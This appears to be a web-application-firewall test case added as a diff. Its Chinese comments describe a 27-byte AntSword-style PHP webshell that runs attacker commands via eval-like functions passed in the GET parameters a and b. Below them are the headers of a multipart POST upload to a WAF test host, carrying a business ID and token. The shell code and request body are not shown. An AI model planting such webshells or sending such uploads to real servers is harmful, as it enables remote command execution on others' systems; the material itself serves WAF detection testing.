@@ -1,0 +1,15 @@
+# webshell_bypass_2
+# 这是一个极其简单的蚁剑Webshell变种文件，采用PHP语言编写。攻击者可以通过发送GET请求，将内容传入a和b参数，若a参数为eval这类函数，b为参数，就能执行恶意命令。
+# 基本信息：
+# - 文件名：waf/webshell_bypass_2.php
+# - 文件大小：27B
+# 行为描述：
+# - 命令执行：接收并执行攻击者发送的系统命令，例如列出目录内容、修改文件权限等。
+POST /?bid=hd_tag_m8mv23s8 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23s8
+RM-PRO-Token: be3f8c234fb48c20e1c9acc03493741d
+RM-PRO-Time: 1742808341199
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=mNnB47UqOLFYPe9u2MACTHL7icnbKVqK
+
